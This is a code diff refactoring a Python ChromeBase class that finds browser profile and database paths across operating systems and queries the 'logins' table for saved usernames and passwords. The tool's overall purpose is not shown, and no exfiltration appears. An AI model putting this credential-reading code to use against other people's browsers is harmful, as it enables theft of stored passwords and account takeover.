@@ -42,25 +42,39 @@ class ChromeBase:
         Update paths with the Chrome versions
         Will change protected members from child class.
         """
+
         def wrapper(*args):
-            if args[0].browser == "chrome":
+
+            cls = args[0]
+            sys_ = platform.system()
+            base_name = cls.browser.base_name
+
+            # Get versions
+            versions = None
+
+            # match sys_:
+            #     case "Windows":
+            #         versions = cls.browser.versions_win
+            #     case "Linux":
+            #         versions = cls.browser.versions_linux
+            #     case "Darwin":
+            #         versions = cls.browser.versions_mac
+
+            if sys_ == "Windows":
+                versions = cls.browser.versions_win
+            elif sys_ == "Linux":
+                versions = cls.browser.versions_linux
+            elif sys_ == "Darwin":
+                versions = cls.browser.versions_mac
+
+            for ver in versions:
                 # Accessing protected member to update the paths.
+                browser_path = cls.browsers_paths[base_name].format(ver=ver)
+                database_path = cls.browsers_database_paths[base_name].format(ver=ver)
 
-                # Fetch all Chrome versions paths
-                args[0]._browser_paths = [
-                    args[0].browsers_paths["chrome"].format(chrome=ver)
-                    for ver in ChromeBase.google_chrome_versions if
-                    os.path.exists(args[0].browsers_paths["chrome"].format(chrome=ver))]
-
-                # Fetch all database paths
-                args[0]._database_paths = [
-                    args[0].browsers_database_paths["chrome"].format(chrome=ver)
-                    for ver in ChromeBase.google_chrome_versions if
-                    os.path.exists(args[0].browsers_paths["chrome"].format(chrome=ver))]
-
-            else:
-                args[0]._browser_paths = [args[0].browsers_paths[args[0].browser]]
-                args[0]._database_paths = [args[0].browsers_database_paths[args[0].browser]]
+                if os.path.exists(browser_path) and os.path.exists(database_path):
+                    cls._browser_paths.append(browser_path)
+                    cls._database_paths.append(database_path)
 
             return func(*args)
 
@@ -108,8 +122,8 @@ class ChromeBase:
                 cursor = db.cursor()  # Initialize cursor for the connection
                 # Get data from the database
                 cursor.execute(
-                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from "
-                    "logins order by date_created")
+                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
+                )
 
                 # Set default values. Some of the values from the database are not filled.
                 creation_time = "unknown"
